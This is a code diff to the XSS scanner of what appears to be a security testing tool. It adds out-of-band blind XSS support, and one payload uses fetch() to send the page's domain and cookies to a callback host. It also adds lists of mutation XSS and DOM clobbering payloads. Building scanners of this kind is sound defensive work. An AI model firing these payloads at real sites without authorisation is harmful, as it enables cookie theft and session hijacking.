@@ -17,8 +17,14 @@ import threading
 import queue
 import concurrent.futures
 from functools import partial
-import websockets
 import asyncio
+
+try:
+    import websockets
+    WEBSOCKETS_AVAILABLE = True
+except ImportError:
+    WEBSOCKETS_AVAILABLE = False
+    websockets = None
 
 # Import opcional do Selenium
 try:
@@ -116,8 +122,34 @@ class XSSScanner:
         self.driver = None
         self.headless_mode = True
         self._selenium_initialized = False
-        
+
+        # OAST client para blind XSS out-of-band
+        self._oast_client = None
+
         self.logger = get_logger(__name__)
+
+    def set_oast_client(self, oast_client) -> None:
+        """Configura cliente OAST para detecção de Blind XSS via callbacks DNS/HTTP.
+
+        Args:
+            oast_client: Instância de OASTClient (spectra.utils.oast).
+        """
+        self._oast_client = oast_client
+        oast_host = oast_client.generate_host("bxss")
+        # Substitui placeholder CALLBACK_URL nos payloads blind_xss com URL OAST real
+        blind_payloads = self._get_default_payloads().get('blind_xss', [])
+        oast_payloads = [
+            p.replace('CALLBACK_URL', f'https://{oast_host}/bxss')
+            for p in blind_payloads
+        ]
+        # Adiciona fetch-based OAST payload que não depende de img
+        oast_payloads.append(
+            f"<script>fetch('https://{oast_host}/bxss?d='+document.domain+'&c='+encodeURIComponent(document.cookie))</script>"
+        )
+        # Substitui categoria blind_xss nos payloads carregados
+        if isinstance(self.payloads, dict):
+            self.payloads['blind_xss'] = oast_payloads
+        self.logger.info(f"OAST blind XSS configurado: {oast_host}")
 
     def _load_payloads(self, custom_payloads_file):
         """Carrega payloads de um ficheiro ou usa payloads padrão."""
@@ -279,7 +311,38 @@ class XSSScanner:
                 "';alert('header-xss-spectra');//",
                 "\";alert('header-xss-spectra');//",
                 "</script><script>alert('header-xss-spectra')</script>",
-            ]
+            ],
+
+            # Mutation XSS (mXSS) — exploits browser HTML parser quirks
+            'mxss': [
+                # Serialization/deserialization parser differentials
+                "<listing><img src='</listing><img src=x onerror=alert(1)>'>",
+                "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>",
+                "<!--[if]><script>alert(1)</script-->",
+                "<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
+                # SVG CDATA differential
+                "<svg><![CDATA[><image xlink:href=']]><img/xlink:href=y onerror=alert(1)/>'>",
+                # innerHTML re-parsing
+                "<p id='</p><img/src/onerror=alert(1)//'>",
+                # Template literal escape
+                "<script>var x=`${alert(1)}`</script>",
+                # Object.prototype pollution via innerHTML
+                "<svg><animate attributeName=href values=javascript:alert(1) /><a id=a><animate attributeName=href values=javascript:alert(1) /></a></svg>",
+            ],
+
+            # DOM Clobbering — overwrites browser globals via HTML id/name attributes
+            'dom_clobbering': [
+                # Clobber window.xss
+                "<img name=xss id=xss src=x onerror=alert(1)>",
+                # Clobber document.cookie
+                "<form id=cookie><input id=length value=1></form>",
+                # Clobber document.forms[0].action  
+                "<form id=login action=javascript:alert(1)>",
+                # Anchor + form clobbering
+                "<a id=spectra-test href=javascript:alert(1)></a>",
+                # Named anchor to clobber location
+                "<a name=location href=javascript:alert(1)></a>",
+            ],
         }
 
     def _detect_context(self, response_text, payload):
